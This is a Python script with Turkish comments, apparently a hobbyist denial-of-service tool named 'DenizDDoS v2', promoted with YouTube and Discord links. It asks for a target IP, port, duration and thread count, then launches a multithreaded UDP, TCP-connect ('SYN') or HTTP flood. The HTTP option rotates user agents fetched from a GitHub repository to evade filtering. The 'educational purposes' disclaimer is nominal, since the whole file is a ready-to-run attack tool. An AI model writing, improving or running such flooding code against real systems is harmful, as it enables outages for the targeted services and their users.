from termcolor import colored
import sys
import os
import time
import socket
import random
import threading
import urllib.request

# === GitHub Yolları (Yeni Repo) ===
GITHUB_RAW = "https://raw.githubusercontent.com/denizzayazzbayarr4458-spec/Denzi-DDoS/main"
UTIL_PATH = f"{GITHUB_RAW}/util"
USERAGENTS_PATH = f"{GITHUB_RAW}/res/lists/useragents"

# Terminali temizle
os.system("clear")
os.system("figlet DenizDDoS")

print()
print(colored("https://www.youtube.com/@denizzqq4", 'cyan'))
print(colored("Discord: denizzqq4", 'magenta'))
print(colored("Davet : https://discord.gg/denizzqq", 'green'))
print(colored("DenizDDoS v2 - Yeni GitHub Entegre", 'yellow'))
print(colored("Saldırı en iyi savunmadır!", 'red'))
print(colored("Eğitim amaçlı. Sorumluluk kabul edilmez.", 'cyan'))
print()

# === User-Agent Listesini GitHub'dan Çek ===
user_agents = []
def load_useragents_from_github():
    global user_agents
    try:
        # Örnek dosya: ua-firefox.txt (sen ekle)
        url = f"{USERAGENTS_PATH}/ua-firefox.txt"
        response = urllib.request.urlopen(url)
        data = response.read().decode('utf-8').strip().split('\n')
        user_agents = [ua.strip() for ua in data if ua.strip() and not ua.startswith('#')]
        print(colored(f"{len(user_agents)} User-Agent yüklendi (Yeni GitHub)", 'green'))
    except Exception as e:
        print(colored("UA listesi yüklenemedi. Varsayılan kullanılıyor.", 'yellow'))
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

# === Util'den Random UA (util/ klasöründen, boşsa buradan) ===
def get_random_ua():
    return random.choice(user_agents) if user_agents else "DenizDDoS/2.0"

# === Log ===
def log_yaz(mesaj):
    with open('ddos_log.txt', 'a') as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {mesaj}\n")

# === Başlangıç ===
load_useragents_from_github()

ip = input("Hedef IP girin: ")
try:
    port = int(input("Hedef port girin: "))
except ValueError:
    print(colored("Geçersiz port!", "red"))
    sys.exit()

try:
    süre = int(input("Süre (saniye): "))
except ValueError:
    print(colored("Geçersiz süre!", "red"))
    sys.exit()

thread_sayisi = int(input("Thread sayısı (50): ") or 50)
random_port = input("Random port? (E/H): ").lower() == 'e'
udp_boyut = int(input("UDP boyutu (1024): ") or 1024)

log_yaz(f"Başlatılıyor → {ip}:{port} | {süre}s | {thread_sayisi} thread")

# === UDP Flood ===
def udp_thread(ip, port, süre, tid):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    hedef_port = port if not random_port else random.randint(1000, 65535)
    bitis = time.time() + süre
    sayac = 0
    while time.time() < bitis:
        try:
            s.sendto(os.urandom(udp_boyut), (ip, hedef_port))
            sayac += 1
            if sayac % 100 == 0:
                print(colored(f"[UDP-{tid}] {sayac} paket", 'yellow'))
        except:
            pass
    s.close()

# === SYN Flood ===
def syn_thread(ip, port, süre, tid):
    bitis = time.time() + süre
    sayac = 0
    while time.time() < bitis:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            sayac += 1
            if sayac % 50 == 0:
                print(colored(f"[SYN-{tid}] {sayac} SYN", 'yellow'))
            s.close()
        except:
            pass

# === HTTP Flood (GoldenEye Stili + Yeni GitHub UA) ===
def http_thread(ip, port, süre, tid):
    url = f"http://{ip}:{port}"
    bitis = time.time() + süre
    sayac = 0
    while time.time() < bitis:
        try:
            req = urllib.request.Request(url)
            req.add_header('User-Agent', get_random_ua())
            req.add_header('Cache-Control', 'no-cache')
            req.add_header('Accept', '*/*')
            req.add_header('Connection', 'keep-alive')
            urllib.request.urlopen(req, timeout=3)
            sayac += 1
            if sayac % 50 == 0:
                print(colored(f"[HTTP-{tid}] {sayac} istek", 'yellow'))
        except:
            pass

# === Saldırı Başlatıcılar ===
def udp_flood(ip, port, süre, threads):
    ts = []
    for i in range(threads):
        t = threading.Thread(target=udp_thread, args=(ip, port, süre/threads, i))
        t.start()
        ts.append(t)
    for t in ts: t.join()

def syn_flood(ip, port, süre, threads):
    ts = []
    for i in range(threads):
        t = threading.Thread(target=syn_thread, args=(ip, port, süre/threads, i))
        t.start()
        ts.append(t)
    for t in ts: t.join()

def http_flood(ip, port, süre, threads):
    ts = []
    for i in range(threads):
        t = threading.Thread(target=http_thread, args=(ip, port, süre/threads, i))
        t.start()
        ts.append(t)
    for t in ts: t.join()

# === Menü ===
print(colored("\nSaldırı Türü:", "green"))
print(colored("1. UDP Flood", "cyan"))
print(colored("2. HTTP Flood (Yeni GitHub UA)", "cyan"))
print(colored("3. SYN Flood", "cyan"))
secim = input(colored("Seçim (1/2/3): ", "green"))

log_yaz(f"Saldırı türü: {secim}")

if secim == "1":
    print(colored("UDP v2 başlatılıyor...", "red"))
    udp_flood(ip, port, süre, thread_sayisi)
    print(colored("UDP tamamlandı!", "red"))
elif secim == "2":
    print(colored("HTTP v2 (Yeni GitHub UA) başlatılıyor...", "red"))
    http_flood(ip, port, süre, thread_sayisi)
    print(colored("HTTP tamamlandı!", "red"))
elif secim == "3":
    print(colored("SYN v2 başlatılıyor...", "red"))
    syn_flood(ip, port, süre, thread_sayisi)
    print(colored("SYN tamamlandı!", "red"))
else:
    print(colored("Geçersiz seçim!", "red"))
    sys.exit()

log_yaz("Saldırı bitti.")
print(colored("Log: ddos_log.txt", "green"))
